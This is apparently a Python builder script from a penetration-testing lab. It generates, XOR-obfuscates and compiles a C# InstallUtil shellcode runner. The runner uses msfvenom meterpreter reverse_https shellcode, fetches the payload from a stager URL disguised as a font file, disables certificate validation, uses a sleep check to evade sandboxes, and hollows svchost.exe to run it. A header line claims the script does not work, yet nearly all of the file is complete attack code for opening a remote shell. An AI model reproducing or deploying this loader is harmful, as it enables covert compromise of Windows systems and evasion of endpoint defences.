#!/bin/env python3

print("THIS DOES NOT WORK!!!!!!!!!!")
############## THIS DOES NOT WORK!!!!!!!!!!!!!!!!!
######


from ak import *
import os
import subprocess

LHOST = "192.168.49.65"
LPORT = 443
BASE_FILENAME = 'win_installutil_shellcode_runner'
#MSFVENOM_CMD = f"msfvenom -p windows/x64/meterpreter/reverse_https LHOST={LHOST} LPORT={LPORT} -f raw -e x64/zutto_dekiru"
MSFVENOM_CMD = f"msfvenom -p windows/meterpreter/reverse_https LHOST={LHOST} LPORT={LPORT} -f raw -e generic/none"
SVCHOST_PATH = b"C:\\\\Windows\\system32\\svchost.exe"
XOR_KEY = b'\x09'
STAGER_URL = "http://192.168.49.65/FontAwesome.woff"
def generate(shellcode):
  svchost_path = Obfuscator(SVCHOST_PATH, xor_key=XOR_KEY)

  template = """
using System;
using System.Net;
using System.Configuration.Install;
using System.Runtime.InteropServices;
namespace Foonaria
{{
   class Program
   {{
       static void Main(string[] args)
       {{
	   Console.WriteLine("This is the days of our lives");
       }}
   }}
   [System.ComponentModel.RunInstaller(true)]
   public class Sample : System.Configuration.Install.Installer
   {{
        [StructLayout(LayoutKind.Sequential, CharSet = CharSet.Unicode)]
        struct STARTUPINFO
        {{
                public Int32 cb;
                public string lpReserved;
                public string lpDesktop;
                public string lpTitle;
                public Int32 dwX;
                public Int32 dwY;
                public Int32 dwXSize;
                public Int32 dwYSize;
                public Int32 dwXCountChars;
                public Int32 dwYCountChars;
                public Int32 dwFillAttribute;
                public Int32 dwFlags;
                public Int16 wShowWindow;
                public Int16 cbReserved2;
                public IntPtr lpReserved2;
                public IntPtr hStdInput;
                public IntPtr hStdOutput;
                public IntPtr hStdError;
        }}

        [StructLayout(LayoutKind.Sequential)]
        internal struct PROCESS_INFORMATION
        {{
                public IntPtr hProcess;
                public IntPtr hThread;
                public int dwProcessId;
                public int dwThreadId;
        }}

        [StructLayout(LayoutKind.Sequential)]
        internal struct PROCESS_BASIC_INFORMATION
        {{
                public IntPtr ExitStatus;
                public IntPtr PebAddress;
                public IntPtr AffinityMask;
                public IntPtr BasePriority;
                public IntPtr UniquePID;
                public IntPtr InheritedFromUniqueProcessId;
        }}

        [DllImport("kernel32.dll", SetLastError = true, CharSet = CharSet.Auto)]
        static extern bool CreateProcess( string lpApplicationName, string lpCommandLine, IntPtr lpProcessAttributes, IntPtr lpThreadAttributes, bool bInheritHandles, uint dwCreationFlags, IntPtr lpEnvironment, string lpCurrentDirectory, [In] ref STARTUPINFO lpStartupInfo, out PROCESS_INFORMATION lpProcessInformation);

        [DllImport("ntdll.dll", SetLastError = true)]
static extern UInt32 ZwQueryInformationProcess( IntPtr hProcess, int procInformationClass, ref PROCESS_BASIC_INFORMATION procInformation, UInt32 ProcInfoLen, ref UInt32 retlen);
        [DllImport("kernel32.dll", SetLastError = true)]
        static extern bool ReadProcessMemory( IntPtr hProcess, IntPtr lpBaseAddress, [Out] byte[] lpBuffer, int dwSize, out IntPtr lpNumberOfBytesRead);

        [DllImport("kernel32.dll")]
        static extern bool WriteProcessMemory( IntPtr hProcess, IntPtr lpBaseAddress, byte[] lpBuffer, Int32 nSize, out IntPtr lpNumberOfBytesWritten);

        [DllImport("kernel32.dll", SetLastError = true)]
        static extern uint ResumeThread(IntPtr hThread);

        [DllImport("kernel32.dll", SetLastError = true, ExactSpelling = true)]
        static extern IntPtr VirtualAllocExNuma(IntPtr hProcess, IntPtr lpAddress, uint dwSize, UInt32 flAllocationType, UInt32 flProtect, UInt32 nndPreferred);

        [DllImport("kernel32.dll", SetLastError = true)]
        public static extern IntPtr GetCurrentProcess();

        [DllImport("kernel32.dll")]
        static extern void Sleep(uint dwMilliseconds);

       public override void Uninstall(System.Collections.IDictionary savedState)
       {{

            DateTime t1 = DateTime.Now;
            Sleep(2000);
            double t2 = DateTime.Now.Subtract(t1).TotalSeconds; if(t2 < 1.5)
            {{ return; }}

            IntPtr mem = VirtualAllocExNuma(GetCurrentProcess(), IntPtr.Zero, 0x1000, 0x3000, 0x4, 0);
            if (mem == null)
            {{
                return;
            }}

            string url = "{stager_url}";
            ServicePointManager.ServerCertificateValidationCallback += (sender, certificate, chain, sslPolicyErrors) => true;
            System.Net.WebClient client = new System.Net.WebClient();
            byte[] buf = client.DownloadData(url);

            // byte[] buf = new byte[] {{ {xor_shellcode}  }};
            byte[] buf2 = new byte[] {{ {xor_svchost_path}  }};

            for (int i = 0; i < buf.Length; i++)
            {{
                buf[i] = (byte)(((uint)buf[i] ^ {xor_key}) & 0xFF);
            }}

            for (int i = 0; i < buf2.Length; i++)
            {{
                buf2[i] = (byte)(((uint)buf2[i] ^ {xor_key}) & 0xFF);
            }}

            STARTUPINFO si = new STARTUPINFO();

            PROCESS_INFORMATION pi = new PROCESS_INFORMATION();

            bool res = CreateProcess(null, System.Text.Encoding.Default.GetString(buf2), IntPtr.Zero,
                    IntPtr.Zero, false, 0x4, IntPtr.Zero, null, ref si, out pi);

            PROCESS_BASIC_INFORMATION bi = new PROCESS_BASIC_INFORMATION();
            uint tmp = 0;
            IntPtr hProcess = pi.hProcess;

            ZwQueryInformationProcess(hProcess, 0, ref bi, (uint)(IntPtr.Size * 6), ref tmp);
            IntPtr ptrToImageBase = (IntPtr)((Int64)bi.PebAddress + 0x10);
            byte[] addrBuf = new byte[IntPtr.Size];
            IntPtr nRead = IntPtr.Zero;

            ReadProcessMemory(hProcess, ptrToImageBase, addrBuf, addrBuf.Length, out nRead);

            IntPtr svchostBase = (IntPtr)(BitConverter.ToInt64(addrBuf, 0));

            byte[] data = new byte[0x200];
            ReadProcessMemory(hProcess, svchostBase, data, data.Length, out nRead);

            uint e_lfanew_offset = BitConverter.ToUInt32(data, 0x3c);

            uint opthdr = e_lfanew_offset + 0x28;

            uint entrypoint_rva = BitConverter.ToUInt32(data, (int)opthdr);

            IntPtr addressOfEntryPoint = (IntPtr)(entrypoint_rva + (UInt64)svchostBase);
            WriteProcessMemory(hProcess, addressOfEntryPoint, buf, buf.Length, out nRead);
            ResumeThread(pi.hThread);

       }}
   }} }}
""".format(xor_shellcode=shellcode.get_hex_csharp(), xor_svchost_path=svchost_path.get_hex_csharp(), xor_key=shellcode.get_key_csharp(), stager_url=STAGER_URL)

  print(template)
  f = open(BASE_FILENAME + '.cs', "w")
  f.write(template)
  f.close()

  f = open(BASE_FILENAME + '.xsc', "wb")
  f.write(shellcode.get_bytes())
  f.close()

  print("Wrote to: "+ BASE_FILENAME + '.xsc')


def compile():
  cmd = f"mcs /r:libraries/System.Management.Automation.dll,libraries/System.Configuration.Install.dll {BASE_FILENAME}.cs"
  os.system(cmd)
  print("Wrote to: "+ BASE_FILENAME + '.exe')

def main():
  shellcode = ShellCode(MSFVENOM_CMD, xor_key=XOR_KEY)
  generate(shellcode)
  compile() 

  print("Make sure shellcode is accessible from: " + STAGER_URL)
  print("Run with ")

if __name__ == "__main__":
  main()
